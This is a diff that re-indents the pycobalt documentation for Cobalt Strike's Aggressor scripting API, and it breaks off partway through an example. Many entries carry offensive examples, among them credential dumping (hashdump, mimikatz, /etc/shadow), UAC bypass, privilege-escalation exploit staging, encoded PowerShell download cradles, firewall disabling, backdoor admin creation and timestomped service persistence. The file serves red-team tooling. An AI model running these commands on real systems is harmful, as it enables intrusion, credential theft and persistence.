@@ -1,3 +1,4 @@
+
 # pycobalt.aggressor
 
 For calling aggressor functions
@@ -15,11 +16,11 @@ $1 - Beacon/Session ID
 Example
 
 command x64 {
-foreach $session (beacons()) {
-if (-is64 $session['id']) {
-println($session);
-}
-}
+    foreach $session (beacons()) {
+        if (-is64 $session['id']) {
+            println($session);
+        }
+    }
 }
 
 ## isadmin
@@ -33,11 +34,11 @@ $1 - Beacon/Session ID
 Example
 
 command admin_sessions {
-foreach $session (beacons()) {
-if (-isadmin $session['id']) {
-println($session);
-}
-}
+    foreach $session (beacons()) {
+        if (-isadmin $session['id']) {
+            println($session);
+        }
+    }
 }
 
 ## isbeacon
@@ -51,11 +52,11 @@ $1 - Beacon/Session ID
 Example
 
 command beacons {
-foreach $session (beacons()) {
-if (-isbeacon $session['id']) {
-println($session);
-}
-}
+    foreach $session (beacons()) {
+        if (-isbeacon $session['id']) {
+            println($session);
+        }
+    }
 }
 
 ## isssh
@@ -69,11 +70,11 @@ $1 - Beacon/Session ID
 Example
 
 command ssh_sessions {
-foreach $session (beacons()) {
-if (-isssh $session['id']) {
-println($session);
-}
-}
+    foreach $session (beacons()) {
+        if (-isssh $session['id']) {
+            println($session);
+        }
+    }
 }
 
 ## action
@@ -144,7 +145,7 @@ $2 - a callback function. Called when the user runs the alias. Arguments are: $0
 Example
 
 alias("foo", {
-btask($1, "foo!");
+    btask($1, "foo!");
 });
 
 ## applications
@@ -170,7 +171,7 @@ An array of dictionary objects with information about your team's activity.
 Example
 
 foreach $index => $entry (archives()) {
-println("\c3( $+ $index $+ )\o $entry");
+    println("\c3( $+ $index $+ )\o $entry");
 }
 
 ## artifact
@@ -305,10 +306,10 @@ Notes
 Example
 
 sub ready {
-local('$handle');
-$handle = openf(">out.exe");
-writeb($handle, $1);
-closef($handle);
+    local('$handle');
+    $handle = openf(">out.exe");
+    writeb($handle, $1);
+    closef($handle);
 }
 
 artifact_stageless("my listener", "exe", "x86", "", &ready);
@@ -442,10 +443,10 @@ $2 - the listener to target.
 Example
 
 item "&Bypass UAC" {
-openPayloadHelper(lambda({
-binput($bids, "bypassuac $1");
-bbypassuac($bids, $1);
-}, $bids => $1));
+    openPayloadHelper(lambda({
+        binput($bids, "bypassuac $1");
+        bbypassuac($bids, $1);
+    }, $bids => $1));
 }
 
 ## bcancel
@@ -460,7 +461,7 @@ $2 - the file to cancel or a wildcard.
 Example
 
 item "&Cancel Downloads" {
-bcancel($1, "*");
+    bcancel($1, "*");
 }
 
 ## bcd
@@ -476,8 +477,8 @@ Example
 
 # create a command to change to the user's home directory
 alias home {
-$home = "c:\\users\\" . binfo($1, "user");
-bcd($1, $home);
+    $home = "c:\\users\\" . binfo($1, "user");
+    bcd($1, $home);
 }
 
 ## bcheckin
@@ -491,8 +492,8 @@ $1 - the id for the beacon. This may be an array or a single ID.
 Example
 
 item "&Checkin" {
-binput($1, "checkin");
-bcheckin($1);
+    binput($1, "checkin");
+    bcheckin($1);
 }
 
 ## bclear
@@ -594,7 +595,7 @@ $1 - the id for the beacon. This may be an array or a single ID.
 Example
 
 item "&Desktop (VNC)" {
-bdesktop($1);
+    bdesktop($1);
 }
 
 ## bdllinject
@@ -651,41 +652,41 @@ Example (ReflectiveDll.c)
 This example is based on Stephen Fewer's Reflective DLL Injection Project:
 
 BOOL WINAPI DllMain( HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved ) {
-BOOL bReturnValue = TRUE;
-switch( dwReason ) {
-case DLL_QUERY_HMODULE:
-if( lpReserved != NULL )
-*(HMODULE *)lpReserved = hAppInstance;
-break;
-case DLL_PROCESS_ATTACH:
-hAppInstance = hinstDLL;
+    BOOL bReturnValue = TRUE;
+    switch( dwReason ) {
+        case DLL_QUERY_HMODULE:
+            if( lpReserved != NULL )
+                *(HMODULE *)lpReserved = hAppInstance;
+            break;
+        case DLL_PROCESS_ATTACH:
+            hAppInstance = hinstDLL;
 
-/* print some output to the operator */
-if (lpReserved != NULL) {
-printf("Hello from test.dll. Parameter is '%s'\n", (char *)lpReserved);
-}
-else {
-printf("Hello from test.dll. There is no parameter\n");
-}
+            /* print some output to the operator */
+            if (lpReserved != NULL) {
+                printf("Hello from test.dll. Parameter is '%s'\n", (char *)lpReserved);
+            }
+            else {
+                printf("Hello from test.dll. There is no parameter\n");
+            }
 
-/* flush STDOUT */
-fflush(stdout);
+            /* flush STDOUT */
+            fflush(stdout);
 
-/* we're done, so let's exit */
-ExitProcess(0);
-break;
-case DLL_PROCESS_DETACH:
-case DLL_THREAD_ATTACH:
-case DLL_THREAD_DETACH:
-break;
-}
-return bReturnValue;
+            /* we're done, so let's exit */
+            ExitProcess(0);
+            break;
+        case DLL_PROCESS_DETACH:
+        case DLL_THREAD_ATTACH:
+        case DLL_THREAD_DETACH:
+            break;
+    }
+    return bReturnValue;
 }
 
 Example (Aggressor Script)
 
 alias hello {
-bdllspawn($1, script_resource("reflective_dll.dll"), $2, "test dll", 5000, false);
+    bdllspawn($1, script_resource("reflective_dll.dll"), $2, "test dll", 5000, false);
 }
 
 ## bdownload
@@ -712,8 +713,8 @@ $1 - the id for the beacon. This may be an array or a single ID.
 Example
 
 item "&Drives" {
-binput($1, "drives");
-bdrives($1);
+    binput($1, "drives");
+    bdrives($1);
 }
 
 ## beacon_command_describe
@@ -757,13 +758,13 @@ $3 - the long-form help for the command.
 Example
 
 alis echo {
-blog($1, "You typed: " . substr($1, 5));
+    blog($1, "You typed: " . substr($1, 5));
 }
 
 beacon_command_register(
-"echo",
-"echo text to beacon log",
-"Synopsis: echo [arguments]\n\nLog arguments to the beacon console");
+    "echo",
+    "echo text to beacon log",
+    "Synopsis: echo [arguments]\n\nLog arguments to the beacon console");
 
 ## beacon_commands
 ```python
@@ -810,10 +811,10 @@ This is the mechanism Cobalt Strike uses for its shell and powershell commands.
 Example
 
 alias shell {
-local('$args');
-$args = substr($0, 6);
-btask($1, "Tasked beacon to run: $args", "T1059");
-beacon_execute_job($1, "%COMSPEC%", " /C $args", 0);
+    local('$args');
+    $args = substr($0, 6);
+    btask($1, "Tasked beacon to run: $args", "T1059");
+    beacon_execute_job($1, "%COMSPEC%", " /C $args", 0);
 }
 
 ## beacon_exploit_describe
@@ -832,6 +833,7 @@ println(beacon_exploit_describe("ms14-058"));
 
 See Also
 &beacon_exploit_register, &beacon_exploits, &belevate
+
 ## beacon_exploit_register
 ```python
 beacon_exploit_register(*args, fork=False)
@@ -848,23 +850,23 @@ Example
 # https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/windows/local/ms16_016_webdav.rb
 
 sub ms16_016_exploit {
-# check if we're on an x64 system and error out.
-if (-is64 $1) {
-berror($1, "ms16-016 exploit is x86 only");
-return;
-}
+    # check if we're on an x64 system and error out.
+    if (-is64 $1) {
+        berror($1, "ms16-016 exploit is x86 only");
+        return;
+    }
 
-# acknowledge this command
-btask($1, "Task Beacon to run " . listener_describe($2) . " via ms16-016");
+    # acknowledge this command
+    btask($1, "Task Beacon to run " . listener_describe($2) . " via ms16-016");
 
-# generate our shellcode
-$stager = shellcode($2, false, "x86");
+    # generate our shellcode
+    $stager = shellcode($2, false, "x86");
 
-# spawn a Beacon post-ex job with the exploit DLL
-bdllspawn!($1, script_resource("modules/cve-2016-0051.x86.dll"), $stager, "ms16-016", 5000);
+    # spawn a Beacon post-ex job with the exploit DLL
+    bdllspawn!($1, script_resource("modules/cve-2016-0051.x86.dll"), $stager, "ms16-016", 5000);
 
-# stage our payload (if this is a bind payload)
-bstage($1, $null, $2, $arch);
+    # stage our payload (if this is a bind payload)
+    bstage($1, $null, $2, $arch);
 }
 
 beacon_exploit_register("ms16-016", "mrxdav.sys WebDav Local Privilege Escalation (CVE 2016-0051)", &ms16_016_exploit);
@@ -900,23 +902,23 @@ A short PowerShell script to download and evaluate the previously script when ru
 Example
 
 alias powershell {
-local('$args $cradle $runme $cmd');
+    local('$args $cradle $runme $cmd');
 
-# $0 is the entire command with no parsing.
-$args   = substr($0, 11);
+    # $0 is the entire command with no parsing.
+    $args   = substr($0, 11);
 
-# generate the download cradle (if one exists) for an imported PowerShell script
-$cradle = beacon_host_imported_script($1);
+    # generate the download cradle (if one exists) for an imported PowerShell script
+    $cradle = beacon_host_imported_script($1);
 
-# encode our download cradle AND cmdlet+args we want to run
-$runme  = base64_encode( str_encode($cradle . $args, "UTF-16LE") );
+    # encode our download cradle AND cmdlet+args we want to run
+    $runme  = base64_encode( str_encode($cradle . $args, "UTF-16LE") );
 
-# Build up our entire command line.
-$cmd    = " -nop -exec bypass -EncodedCommand \" $+ $runme $+ \"";
+    # Build up our entire command line.
+    $cmd    = " -nop -exec bypass -EncodedCommand \" $+ $runme $+ \"";
 
-# task Beacon to run all of this.
-btask($1, "Tasked beacon to run: $args", "T1086");
-beacon_execute_job($1, "powershell", $cmd, 1);
+    # task Beacon to run all of this.
+    btask($1, "Tasked beacon to run: $args", "T1086");
+    beacon_execute_job($1, "powershell", $cmd, 1);
 }
 
 ## beacon_host_script
@@ -933,12 +935,12 @@ A short PowerShell script to download and evaluate the script when run. How this
 Example
 
 alias test {
-local('$script $hosted');
-$script = "2 + 2";
-$hosted = beacon_host_script($1, $script);
+    local('$script $hosted');
+    $script = "2 + 2";
+    $hosted = beacon_host_script($1, $script);
 
-binput($1, "powerpick $hosted");
-bpowerpick($1, $hosted);
+    binput($1, "powerpick $hosted");
+    bpowerpick($1, $hosted);
 }
 
 ## beacon_ids
@@ -952,7 +954,7 @@ An array of beacon IDs
 Example
 
 foreach $bid (beacon_ids()) {
-println("Bid: $bid");
+    println("Bid: $bid");
 }
 
 ## beacon_info
@@ -979,6 +981,7 @@ beacon_remove(*args, fork=False)
 Remove a Beacon from the display.
 Arguments
 $1 - the id for the beacon to remove
+
 ## beacons
 ```python
 beacons(*args, fork=False)
@@ -990,7 +993,7 @@ An array of dictionary objects with information about each beacon.
 Example
 
 foreach $beacon (beacons()) {
-println("Bid: " . $beacon['id'] . " is " . $beacon['name']);
+    println("Bid: " . $beacon['id'] . " is " . $beacon['name']);
 }
 
 ## belevate
@@ -1006,10 +1009,10 @@ $3 - the listener to target.
 Example
 
 item "&Elevate 31337" {
-openPayloadHelper(lambda({
-binput($bids, "elevate ms14-058 $1");
-belevate($bids, "ms14-058", $1);
-}, $bids => $1));
+    openPayloadHelper(lambda({
+        binput($bids, "elevate ms14-058 $1");
+        belevate($bids, "ms14-058", $1);
+    }, $bids => $1));
 }
 
 See Also
@@ -1027,7 +1030,7 @@ $2 - the text to post
 Example
 
 alias donotrun {
-berror($1, "You should never run this command!");
+    berror($1, "You should never run this command!");
 }
 
 ## bexecute
@@ -1062,7 +1065,7 @@ Compile your custom .NET programs with a .NET 3.5 compiler for compatability wit
 Example
 
 alias myutil {
-bexecute_assembly($1, script_resource("myutil.exe"), "arg1 arg2 \"arg 3\"");
+    bexecute_assembly($1, script_resource("myutil.exe"), "arg1 arg2 \"arg 3\"");
 }
 
 ## bexit
@@ -1076,8 +1079,8 @@ $1 - the id for the beacon. This may be an array or a single ID.
 Example
 
 item "&Die" {
-binput($1, "exit");
-bexit($1);
+    binput($1, "exit");
+    bexit($1);
 }
 
 ## bgetprivs
@@ -1093,7 +1096,7 @@ https://msdn.microsoft.com/en-us/library/windows/desktop/bb530716(v=vs.85).aspx
 Example
 
 alias debug {
-bgetprivs($1, "SeDebugPriv");
+    bgetprivs($1, "SeDebugPriv");
 }
 
 ## bgetsystem
@@ -1107,8 +1110,8 @@ $1 - the id for the beacon. This may be an array or a single ID.
 Example
 
 item "Get &SYSTEM" {
-binput($1, "getsystem");
-bgetsystem($1);
+    binput($1, "getsystem");
+    bgetsystem($1);
 }
 
 ## bgetuid
@@ -1133,8 +1136,8 @@ $1 - the id for the beacon. This may be an array or a single ID.
 Example
 
 item "Dump &Hashes" {
-binput($1, "hashdump");
-bhashdump($1);
+    binput($1, "hashdump");
+    bhashdump($1);
 }
 
 ## binfo
@@ -1209,9 +1212,9 @@ $2 - callback function with the ipconfig results. Arguments to the callback are:
 Example
 
 alias ipconfig {
-bipconfig($1, {
-blog($1, "Network information is:\n $+ $2");
-});
+    bipconfig($1, {
+        blog($1, "Network information is:\n $+ $2");
+    });
 }
 
 ## bjobkill
@@ -1251,7 +1254,7 @@ $2 - the local path the ccache file
 Example
 
 alias kerberos_ccache_use {
-bkerberos_ccache_use($1, $2);
+    bkerberos_ccache_use($1, $2);
 }
 
 ## bkerberos_ticket_purge
@@ -1265,7 +1268,7 @@ $1 - the id for the beacon. This may be an array or a single ID.
 Example
 
 alias kerberos_ticket_purge {
-bkerberos_ticket_purge($1);
+    bkerberos_ticket_purge($1);
 }
 
 ## bkerberos_ticket_use
@@ -1280,7 +1283,7 @@ $2 - the local path the kirbi file
 Example
 
 alias kerberos_ticket_use {
-bkerberos_ticket_use($1, $2);
+    bkerberos_ticket_use($1, $2);
 }
 
 ## bkeylogger
@@ -1335,7 +1338,7 @@ $2 - the text to post
 Example
 
 alias demo {
-blog($1, "I am output for the blog function");
+    blog($1, "I am output for the blog function");
 }
 
 ## blog2
@@ -1350,7 +1353,7 @@ $2 - the text to post
 Example
 
 alias demo2 {
-blog2($1, "I am output for the blog2 function");
+    blog2($1, "I am output for the blog2 function");
 }
 
 ## bloginuser
@@ -1368,9 +1371,9 @@ Example
 
 # make a token for a user with an empty password
 alias make_token_empty {
-local('$domain $user');
-($domain, $user) = split("\\\\", $2);]
-bloginuser($1, $domain, $user, "");
+    local('$domain $user');
+    ($domain, $user) = split("\\\\", $2);]
+    bloginuser($1, $domain, $user, "");
 }
 
 ## blogonpasswords
@@ -1384,8 +1387,8 @@ $1 - the id for the beacon. This may be an array or a single ID.
 Example
 
 item "Dump &Passwords" {
-binput($1, "logonpasswords");
-blogonpasswords($1);
+    binput($1, "logonpasswords");
+    blogonpasswords($1);
 }
 
 ## bls
@@ -1410,7 +1413,7 @@ $3 - an optional callback function with the ps results. Arguments to the callbac
 Example
 
 on beacon_initial {
-bls($1, ".");
+    bls($1, ".");
 }
 
 ## bmimikatz
@@ -1425,7 +1428,7 @@ $2 - the command and arguments to run
 Example
 
 alias coffee {
-bmimikatz($1, "standard::coffee");
+    bmimikatz($1, "standard::coffee");
 }
 
 ## bmkdir
@@ -1453,8 +1456,8 @@ $2 - the data channel (e.g., dns, dns6, dns-txt, or http)
 Example
 
 item "Mode DNS-TXT" {
-binput($1, "mode dns-txt");
-bmode($1, "dns-txt");
+    binput($1, "mode dns-txt");
+    bmode($1, "dns-txt");
 }
 
 ## bmv
@@ -1537,7 +1540,7 @@ Example
 # ladmins [target]
 #   find the local admins for a target
 alias ladmins {
-bnet($1, "localgroup", $2, "administrators");
+    bnet($1, "localgroup", $2, "administrators");
 }
 
 ## bnote
@@ -1580,7 +1583,7 @@ $2 - how long the Beacon should pause execution for (milliseconds)
 Example
 
 alias pause {
-bpause($1, int($2));
+    bpause($1, int($2));
 }
 
 ## bportscan
@@ -1612,7 +1615,7 @@ Example
 
 # get the version of PowerShell available via Unmanaged PowerShell
 alias powerver {
-bpowerpick($1, '$PSVersionTable.PSVersion');
+    bpowerpick($1, '$PSVersionTable.PSVersion');
 }
 
 ## bpowershell
@@ -1628,7 +1631,7 @@ Example
 
 # get the version of PowerShell...
 alias powerver {
-bpowershell($1, '$PSVersionTable.PSVersion');
+    bpowershell($1, '$PSVersionTable.PSVersion');
 }
 
 ## bpowershell_import
@@ -1644,8 +1647,8 @@ Example
 
 # quickly run PowerUp
 alias powerup {
-bpowershell_import($1, script_resource("PowerUp.ps1"));
-bpowershell($1, "Invoke-AllChecks");
+    bpowershell_import($1, script_resource("PowerUp.ps1"));
+    bpowershell($1, "Invoke-AllChecks");
 }
 
 ## bppid
@@ -1664,22 +1667,22 @@ Example
 
 # getexplorerpid($bid, &callback);
 sub getexplorerpid {
-bps($1, lambda({
-local('$pid $name $entry');
-foreach $entry (split("\n", $2)) {
-($name, $null, $pid) = split("\\s+", $entry);
-if ($name eq "explorer.exe") {
-[$callback: $1, $pid];
-}
-}
-}, $callback => $2));
+    bps($1, lambda({
+        local('$pid $name $entry');
+        foreach $entry (split("\n", $2)) {
+            ($name, $null, $pid) = split("\\s+", $entry);
+            if ($name eq "explorer.exe") {
+                [$callback: $1, $pid];
+            }
+        }
+    }, $callback => $2));
 }
 
 alias prepenv {
-btask($1, "Tasked Beacon to find explorer.exe and make it the PPID");
-getexplorerpid($1, {
-bppid($1, $2);
-});
+    btask($1, "Tasked Beacon to find explorer.exe and make it the PPID");
+    getexplorerpid($1, {
+        bppid($1, $2);
+    });
 }
 
 ## bps
@@ -1703,7 +1706,7 @@ $2 - an optional callback function with the ps results. Arguments to the callbac
 Example
 
 on beacon_initial {
-bps($1);
+    bps($1);
 }
 
 ## bpsexec
@@ -1739,7 +1742,7 @@ Example
 # disable the firewall on a remote target
 # beacon> shieldsdown [target]
 alias shieldsdown {
-bpsexec_command($1, $2, "shieldsdn", "cmd.exe /c netsh advfirewall set allprofiles state off");
+    bpsexec_command($1, $2, "shieldsdn", "cmd.exe /c netsh advfirewall set allprofiles state off");
 }
 
 ## bpsexec_psh
@@ -1784,7 +1787,7 @@ $1 - the id for the beacon. This may be an array or a single ID.
 Example
 
 alias pwd {
-bpwd($1);
+    bpwd($1);
 }
 
 ## breg_query
@@ -1800,7 +1803,7 @@ $3 - x86|x64 - which view of the registry to use
 Example
 
 alias typedurls {
-breg_query($1, "HKCU\\Software\\Microsoft\\Internet Explorer\\TypedURLs", "x86");
+    breg_query($1, "HKCU\\Software\\Microsoft\\Internet Explorer\\TypedURLs", "x86");
 }
 
 ## breg_queryv
@@ -1817,7 +1820,7 @@ $4 - x86|x64 - which view of the registry to use
 Example
 
 alias winver {
-breg_queryv($1, "HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion", "ProductName", "x86");
+    breg_queryv($1, "HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion", "ProductName", "x86");
 }
 
 ## brev2self
@@ -1831,7 +1834,7 @@ $1 - the id for the beacon. This may be an array or a single ID.
 Example
 
 alias rev2self {
-brev2self($1);
+    brev2self($1);
 }
 
 ## brm
@@ -1938,8 +1941,8 @@ $2 - how long to take the screenshot for
 Example
 
 item "&Screenshot" {
-binput($1, "screenshot");
-bscreenshot($1, 0);
+    binput($1, "screenshot");
+    bscreenshot($1, 0);
 }
 
 ## bsetenv
@@ -1955,8 +1958,8 @@ $3 - the value to set the environment variable to (specify $null to unset the va
 Example
 
 alias tryit {
-bsetenv($1, "foo", "BAR!");
-bshell($1, "echo %foo%");
+    bsetenv($1, "foo", "BAR!");
+    bshell($1, "echo %foo%");
 }
 
 ## bshell
@@ -1971,8 +1974,8 @@ $2 - the command and arguments to run
 Example
 
 alias adduser {
-bshell($1, "net user $2 B00gyW00gy1234! /ADD");
-bshell($1, "net localgroup \"Administrators\" $2 /ADD");
+    bshell($1, "net user $2 B00gyW00gy1234! /ADD");
+    bshell($1, "net localgroup \"Administrators\" $2 /ADD");
 }
 
 ## bshinject
@@ -2017,8 +2020,8 @@ $3 - the jitter factor [0-99]
 Example
 
 alias stealthy {
-# sleep for 1 hour with 30% jitter factor
-bsleep($1, 60 * 60, 30);
+    # sleep for 1 hour with 30% jitter factor
+    bsleep($1, 60 * 60, 30);
 }
 
 ## bsocks
@@ -2033,7 +2036,7 @@ $2 - the port to bind to
 Example
 
 alias socks1234 {
-bsocks($1, 1234);
+    bsocks($1, 1234);
 }
 
 ## bsocks_stop
@@ -2047,7 +2050,7 @@ $1 - the id for the beacon. This may be an array or a single ID.
 Example
 
 alias stopsocks {
-bsocks_stop($1);
+    bsocks_stop($1);
 }
 
 ## bspawn
@@ -2063,10 +2066,10 @@ $3 - the architecture to spawn a process for (defaults to x86)
 Example
 
 item "&Spawn" {
-openPayloadHelper(lambda({
-binput($bids, "spawn x86 $1");
-bspawn($bids, $1, "x86");
-}, $bids => $1));
+    openPayloadHelper(lambda({
+        binput($bids, "spawn x86 $1");
+        bspawn($bids, $1, "x86");
+    }, $bids => $1));
 }
 
 ## bspawnas
@@ -2105,8 +2108,8 @@ Example
 
 # let's make everything lame.
 on beacon_initial {
-bspawnto($1, "%windir%\\syswow64\\notepad.exe", "x86");
-bspawnto($1, "%windir%\\sysnative\\notepad.exe", "x64");
+    bspawnto($1, "%windir%\\syswow64\\notepad.exe", "x86");
+    bspawnto($1, "%windir%\\sysnative\\notepad.exe", "x64");
 }
 
 ## bspawnu
@@ -2174,7 +2177,7 @@ Example
 
 # stage [target] [listener name]
 alias stage {
-bstage($1, $2, $3, "x86");
+    bstage($1, $2, $3, "x86");
 }
 
 ## bsteal_token
@@ -2189,7 +2192,7 @@ $2 - the PID to take the token from
 Example
 
 alias steal_token {
-bsteal_token($1, int($2));
+    bsteal_token($1, int($2));
 }
 
 ## bsudo
@@ -2206,7 +2209,7 @@ Example
 
 # hashdump [password]
 ssh_alias hashdump {
-bsudo($1, $2, "cat /etc/shadow");
+    bsudo($1, $2, "cat /etc/shadow");
 }
 
 ## btask
@@ -2223,7 +2226,7 @@ https://attack.mitre.org
 Example
 
 alias foo {
-btask($1, "User tasked beacon to foo", "T1015");
+    btask($1, "User tasked beacon to foo", "T1015");
 }
 
 ## btimestomp
@@ -2239,11 +2242,11 @@ $3 - the file to grab timestamp values from
 Example
 
 alias persist {
-bcd($1, "c:\\windows\\system32");
-bupload($1, script_resource("evil.exe"));
-btimestomp($1, "evil.exe", "cmd.exe");
-bshell($1, 'sc create evil binpath= "c:\\windows\\system32\\evil.exe"');
-bshell($1, 'sc start netsrv');
+    bcd($1, "c:\\windows\\system32");
+    bupload($1, script_resource("evil.exe"));
+    btimestomp($1, "evil.exe", "cmd.exe");
+    bshell($1, 'sc create evil binpath= "c:\\windows\\system32\\evil.exe"');
+    bshell($1, 'sc start netsrv');
 }
 
 ## bunlink
@@ -2299,8 +2302,8 @@ $1 - the id for the beacon. This may be an array or a single ID.
 Example
 
 item "Dump &Passwords (WDigest)" {
-binput($1, "wdigest");
-bwdigest($1);
+    binput($1, "wdigest");
+    bwdigest($1);
 }
 
 
@@ -2376,9 +2379,9 @@ $5 - host
 Example
 
 command falsecreds {
-for ($x = 0; $x < 100; $x++) {
-credential_add("user $+ $x", "password $+ $x");
-}
+    for ($x = 0; $x < 100; $x++) {
+        credential_add("user $+ $x", "password $+ $x");
+    }
 }
 
 ## credentials
@@ -2404,8 +2407,8 @@ A list of keys that you may query with &data_query
 Example
 
 foreach $key (data_keys()) {
-println("\n\c4=== $key ===\n");
-println(data_query($key));
+    println("\n\c4=== $key ===\n");
+    println(data_query($key));
 }
 
 ## data_query
@@ -2464,8 +2467,8 @@ A scalar with a $dialog object.
 Example
 
 sub callback {
-# prints: Pressed Go, a is: Apple
-println("Pressed $2 $+ , a is: " . $3['a']);
+    # prints: Pressed Go, a is: Apple
+    println("Pressed $2 $+ , a is: " . $3['a']);
 }
 
 $dialog = dialog("Hello World", %(a => "Apple", b => "Bat"), &callback);
@@ -2510,7 +2513,7 @@ $1 - the function to call
 Example
 
 dispatch_event({
-println("Hello World");
+    println("Hello World");
 });
 
 ## downloads
@@ -2816,7 +2819,7 @@ Example
 
 # run the foo alias when a new Beacon comes in
 on beacon_initial {
-fireAlias($1, "foo", "bar!");
+    fireAlias($1, "foo", "bar!");
 }
 
 ## fireEvent
@@ -2831,7 +2834,7 @@ $1 - the event name
 Example
 
 on foo {
-println("Argument is: $1");
+    println("Argument is: $1");
 }
 
 fireEvent("foo", "Hello World!");
@@ -2884,6 +2887,7 @@ println(gzip("this is a test"));
 
 See Also
 &gunzip
+
 ## host_delete
 ```python
 host_delete(*args, fork=False)
@@ -2919,10 +2923,10 @@ Example
 
 # create a script console alias to dump host info
 command host {
-println("Host $1");
-foreach $key => $value (host_info($1)) {
-println("$[15]key $value");
-}
+    println("Host $1");
+    foreach $key => $value (host_info($1)) {
+        println("$[15]key $value");
+    }
 }
 
 ## host_update
@@ -2967,11 +2971,11 @@ $1 - the popup hook
 Example
 
 popup beacon {
-# menu definitions above this point
+    # menu definitions above this point
 
-insert_menu("beacon_bottom", $1);
+    insert_menu("beacon_bottom", $1);
 
-# menu definitions below this point
+    # menu definitions below this point
 }
 
 ## iprange
@@ -3054,12 +3058,12 @@ Example
 
 # create a foreign listener
 listener_create("My Metasploit", "windows/foreign_https/reverse_https",
-"ads.losenolove.com", 443);
+        "ads.losenolove.com", 443);
 
 # create an HTTP Beacon listener
 listener_create("Beacon HTTP", "windows/beacon_http/reverse_http",
-"www.losenolove.com", 80,
-"www.losenolove.com, www2.losenolove.com");
+        "www.losenolove.com", 80,
+        "www.losenolove.com, www2.losenolove.com");
 
 ## listener_delete
 ```python
@@ -3087,7 +3091,7 @@ A string describing the listener
 Example
 
 foreach $name (listeners()) {
-println("$name is: " . listener_describe($name));
+    println("$name is: " . listener_describe($name));
 }
 
 ## listener_info
@@ -3112,10 +3116,10 @@ Example
 
 # create a script console alias to dump listener info
 command dump {
-println("Listener $1");
-foreach $key => $value (listener_info($1)) {
-println("$[15]key $value");
-}
+    println("Listener $1");
+    foreach $key => $value (listener_info($1)) {
+        println("$[15]key $value");
+    }
 }
 
 ## listener_pivot_create
@@ -3137,16 +3141,16 @@ Example
 # create a pivot listener:
 # $1 = beaconID, $2 = name, $3 = port
 alias plisten {
-local('$lhost $bid $name $port');
+    local('$lhost $bid $name $port');
 
-# extract our arguments
-($bid, $name, $port) = @_;
+    # extract our arguments
+    ($bid, $name, $port) = @_;
 
-# get the name of our target
-$lhost = beacon_info($1, "computer");
+    # get the name of our target
+    $lhost = beacon_info($1, "computer");
 
-btask($1, "create TCP listener on $lhost $+ : $+ $port");
-listener_pivot_create($1, $name, "windows/beacon_reverse_tcp", $lhost, $port);
+    btask($1, "create TCP listener on $lhost $+ : $+ $port");
+    listener_pivot_create($1, $name, "windows/beacon_reverse_tcp", $lhost, $port);
 }
 
 ## listener_restart
@@ -3218,7 +3222,7 @@ Activate the tab that is to the right of the current tab.
 Example
 
 bind Ctrl+Right {
-nextTab();
+    nextTab();
 }
 
 ## on
@@ -3233,7 +3237,7 @@ $2 - a callback function. Called when the event happens.
 Example
 
 sub foo {
-blog($1, "Foo!");
+    blog($1, "Foo!");
 }
 
 on("beacon_initial", &foo);
@@ -3289,10 +3293,10 @@ $1 - the Beacon ID to apply this feature to
 Example
 
 item "Interact" {
-local('$bid');
-foreach $bid ($1) {
-openBeaconConsole($bid);
-}
+    local('$bid');
+    foreach $bid ($1) {
+        openBeaconConsole($bid);
+    }
 }
 
 ## openBrowserPivotSetup
@@ -3306,10 +3310,10 @@ $1 - the Beacon ID to apply this feature to
 Example
 
 item "Browser Pivoting" {
-local('$bid');
-foreach $bid ($1) {
-openBrowserPivotSetup($bid);
-}
+    local('$bid');
+    foreach $bid ($1) {
+        openBrowserPivotSetup($bid);
+    }
 }
 
 ## openBypassUACDialog
@@ -3323,10 +3327,10 @@ $1 - the beacon ID
 Example
 
 item "Bypass UAC" {
-local('$bid');
-foreach $bid ($1) {
-openBypassUACDialog($bid);
-}
+    local('$bid');
+    foreach $bid ($1) {
+        openBypassUACDialog($bid);
+    }
 }
 
 ## openCloneSiteDialog
@@ -3360,10 +3364,10 @@ $1 - the Beacon ID to apply this feature to
 Example
 
 item "VPN Pivoting" {
-local('$bid');
-foreach $bid ($1) {
-openCovertVPNSetup($bid);
-}
+    local('$bid');
+    foreach $bid ($1) {
+        openCovertVPNSetup($bid);
+    }
 }
 
 ## openCredentialManager
@@ -3397,10 +3401,10 @@ $1 - the beacon ID
 Example
 
 item "Elevate" {
-local('$bid');
-foreach $bid ($1) {
-openElevateDialog($bid);
-}
+    local('$bid');
+    foreach $bid ($1) {
+        openElevateDialog($bid);
+    }
 }
 
 ## openEventLog
@@ -3424,10 +3428,10 @@ $1 - the Beacon ID to apply this feature to
 Example
 
 item "Browse Files" {
-local('$bid');
-foreach $bid ($1) {
-openFileBrowser($bid);
-}
+    local('$bid');
+    foreach $bid ($1) {
+        openFileBrowser($bid);
+    }
 }
 
 ## openGoldenTicketDialog
@@ -3441,10 +3445,10 @@ $1 - the Beacon ID to apply this feature to
 Example
 
 item "Golden Ticket" {
-local('$bid');
-foreach $bid ($1) {
-openGoldenTicketDialog($bid);
-}
+    local('$bid');
+    foreach $bid ($1) {
+        openGoldenTicketDialog($bid);
+    }
 }
 
 ## openHTMLApplicationDialog
@@ -3541,10 +3545,10 @@ $1 - the Beacon ID to apply this feature to
 Example
 
 item "Make Token" {
-local('$bid');
-foreach $bid ($1) {
-openMakeTokenDialog($bid);
-}
+    local('$bid');
+    foreach $bid ($1) {
+        openMakeTokenDialog($bid);
+    }
 }
 
 ## openOfficeMacro
@@ -3568,10 +3572,10 @@ $1 - the Beacon ID
 Example
 
 item "&Activate" {
-local('$bid');
-foreach $bid ($1) {
-openOrActivate($bid);
-}
+    local('$bid');
+    foreach $bid ($1) {
+        openOrActivate($bid);
+    }
 }
 
 ## openPayloadGeneratorDialog
@@ -3595,7 +3599,7 @@ $1 - a callback function. Arguments: $1 - the selected listener.
 Example
 
 openPayloadHelper(lambda({
-bspawn($bid, $1);
+    bspawn($bid, $1);
 }, $bid => $1));
 
 ## openPivotListenerSetup
@@ -3609,10 +3613,10 @@ $1 - the Beacon ID to apply this feature to
 Example
 
 item "Listener..." {
-local('$bid');
-foreach $bid ($1) {
-openPivotListenerSetup($bid);
-}
+    local('$bid');
+    foreach $bid ($1) {
+        openPivotListenerSetup($bid);
+    }
 }
 
 ## openPortScanner
@@ -3638,10 +3642,10 @@ $1 - the beacon to target with this feature
 Example
 
 item "Scan" {
-local('$bid');
-foreach $bid ($1) {
-openPortScannerLocal($bid);
-}
+    local('$bid');
+    foreach $bid ($1) {
